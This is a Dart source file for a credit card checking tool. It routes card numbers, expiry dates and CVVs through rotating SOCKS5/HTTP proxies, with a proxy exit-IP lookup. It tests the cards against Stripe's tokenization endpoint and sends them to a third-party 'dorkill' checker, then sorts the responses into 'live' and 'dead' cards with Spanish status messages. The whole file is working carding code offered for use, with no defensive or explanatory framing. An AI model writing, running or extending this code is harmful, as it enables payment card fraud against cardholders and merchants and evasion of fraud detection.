          import 'dart:convert';
          import 'dart:io';
          import 'dart:math';

          import 'package:http/http.dart' as http;
          import 'package:http/io_client.dart';

          import 'core.dart';
          import 'models.dart';

          class ProbeResult {
            const ProbeResult({required this.ok, required this.ms});
            final bool ok;
            final int ms;
          }

          class CheckResult {
            const CheckResult({required this.status, required this.message, this.gateway = '', this.latencyMs = 0});
            final CheckStatus status;
            final String message;
            final String gateway;
            final int latencyMs;
          }

          class CheckEngine {
            CheckEngine(this.cfg, {List<ProxyNode>? proxies}) : _proxies = proxies ?? const [];

            final Settings cfg;
            final List<ProxyNode> _proxies;
            final _rnd = Random();

            http.Client _client(ProxyNode? p) {
              final hc = HttpClient()..connectionTimeout = Duration(seconds: cfg.timeoutSec);
              if (p != null) {
                hc.findProxy = (_) =>
                    p.kind == ProxyKind.socks5 ? 'SOCKS5 ${p.host}:${p.port}' : 'PROXY ${p.host}:${p.port}';
              }
              return IOClient(hc);
            }

            ProxyNode? _pick() {
              if (!cfg.useProxies) return null;
              final pool = _proxies.where((p) => p.health != ProxyHealth.down).toList();
              if (pool.isEmpty) return null;
              return pool[_rnd.nextInt(pool.length)];
            }

            Future<ProbeResult> probe(ProxyNode? p) async {
              final sw = Stopwatch()..start();
              final client = _client(p);
              try {
                final r = await client.get(Uri.parse(cfg.probeUrl)).timeout(Duration(seconds: cfg.timeoutSec));
                sw.stop();
                return ProbeResult(ok: r.statusCode < 500, ms: sw.elapsedMilliseconds);
              } catch (_) {
                sw.stop();
                return ProbeResult(ok: false, ms: sw.elapsedMilliseconds);
              } finally {
                client.close();
              }
            }

            Future<String?> exitInfo(ProxyNode p) async {
              final client = _client(p);
              try {
                final r = await client
                    .get(Uri.parse('https://api.ipify.org?format=json'))
                    .timeout(Duration(seconds: cfg.timeoutSec));
                if (r.statusCode != 200) return null;
                return (jsonDecode(r.body) as Map<String, dynamic>)['ip'] as String?;
              } catch (_) {
                return null;
              } finally {
                client.close();
              }
            }

            String get _sk => cfg.stripeKey.isEmpty ? stripePk : cfg.stripeKey;

            Future<CheckResult> check(CreditCard card) async {
              final max = cfg.retries + 1;
              var attempt = 0;

              while (attempt < max) {
                final p = _pick();
                final r = cfg.engine == 'both'
                    ? await _cascade(card, p)
                    : cfg.engine == 'dorkill'
                        ? await _dorkill(card, p)
                        : await _stripe(card, p);

                if (r.status != CheckStatus.unknown) return r;
                attempt++;
                if (attempt < max) await Future.delayed(Duration(milliseconds: 250 * attempt));
              }

              return const CheckResult(status: CheckStatus.unknown, message: 'sin respuesta', gateway: '');
            }

            Future<CheckResult> _stripe(CreditCard card, ProxyNode? p) async {
              final sw = Stopwatch()..start();
              final client = _client(p);
              try {
                final r = await client
                    .post(
                      Uri.parse(stripeTokenUrl),
                      headers: {
                        'Authorization': 'Bearer $_sk',
                        'Content-Type': 'application/x-www-form-urlencoded',
                      },
                      body: {
                        'card[number]': card.pan,
                        'card[exp_month]': card.expMonth.toString().padLeft(2, '0'),
                        'card[exp_year]': card.expYear.toString().padLeft(2, '0'),
                        'card[cvc]': card.cvv,
                      },
                    )
                    .timeout(Duration(seconds: cfg.timeoutSec));
                sw.stop();

                final j = jsonDecode(r.body) as Map<String, dynamic>;

                if (r.statusCode == 200 && j['id'] != null) {
                  return CheckResult(status: CheckStatus.live, message: 'aprobada', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
                }

                final err = (j['error'] as Map?) ?? const {};
                final code = (err['code'] ?? '').toString();
                final decline = (err['decline_code'] ?? '').toString();
                final msg = (err['message'] ?? 'rechazada').toString();

                if (code == 'card_declined') {
                  return CheckResult(status: CheckStatus.dead, message: decline.isEmpty ? 'declinada' : decline, gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
                }
                if (code == 'incorrect_number' || code == 'invalid_number') {
                  return CheckResult(status: CheckStatus.dead, message: 'numero invalido', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
                }
                if (code == 'expired_card') {
                  return CheckResult(status: CheckStatus.dead, message: 'vencida', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
                }
                if (code == 'incorrect_cvc') {
                  return CheckResult(status: CheckStatus.dead, message: 'cvv incorrecto', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
                }
                return CheckResult(status: CheckStatus.unknown, message: msg, gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
              } catch (_) {
                sw.stop();
                return CheckResult(status: CheckStatus.unknown, message: 'red', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
              } finally {
                client.close();
              }
            }

            Future<CheckResult> _dorkill(CreditCard card, ProxyNode? p) async {
              if (cfg.dorkillKey.isEmpty) {
                return const CheckResult(status: CheckStatus.unknown, message: 'falta API key', gateway: 'dorkill');
              }

              final sw = Stopwatch()..start();
              final client = _client(p);
              try {
                final uri = Uri.parse(dorkillUrl).replace(queryParameters: {
                  'card': '${card.pan}|${card.expLabel}|${card.cvv}',
                  'key': cfg.dorkillKey,
                });
                final r = await client.get(uri).timeout(Duration(seconds: cfg.timeoutSec));
                sw.stop();

                final text = r.body.toLowerCase();
                if (text.contains('"live"') || text.contains('approved') || text.contains('"charged":true') || text.contains('"status":"success"')) {
                  return CheckResult(status: CheckStatus.live, message: 'aprobada', gateway: 'dorkill', latencyMs: sw.elapsedMilliseconds);
                }
                if (text.contains('declined') || text.contains('"status":"fail"') || text.contains('invalid')) {
                  return CheckResult(status: CheckStatus.dead, message: 'declinada', gateway: 'dorkill', latencyMs: sw.elapsedMilliseconds);
                }
                return CheckResult(
                  status: CheckStatus.unknown,
                  message: text.length > 60 ? text.substring(0, 60) : text,
                  gateway: 'dorkill',
                  latencyMs: sw.elapsedMilliseconds,
                );
              } catch (_) {
                sw.stop();
                return CheckResult(status: CheckStatus.unknown, message: 'red', gateway: 'dorkill', latencyMs: sw.elapsedMilliseconds);
              } finally {
                client.close();
              }
            }

            Future<CheckResult> _cascade(CreditCard card, ProxyNode? p) async {
              final a = await _stripe(card, p);
              if (a.status == CheckStatus.live) return a;

              final b = await _dorkill(card, p);
              if (b.status == CheckStatus.live) return b;

              if (a.status == CheckStatus.dead && b.status == CheckStatus.dead) {
                return CheckResult(status: CheckStatus.dead, message: '${a.message} + ${b.message}', gateway: 'cascada', latencyMs: a.latencyMs + b.latencyMs);
              }
              if (a.status == CheckStatus.dead) return a;
              if (b.status == CheckStatus.dead) return b;
              return const CheckResult(status: CheckStatus.unknown, message: 'sin respuesta', gateway: 'cascada');
            }
          }
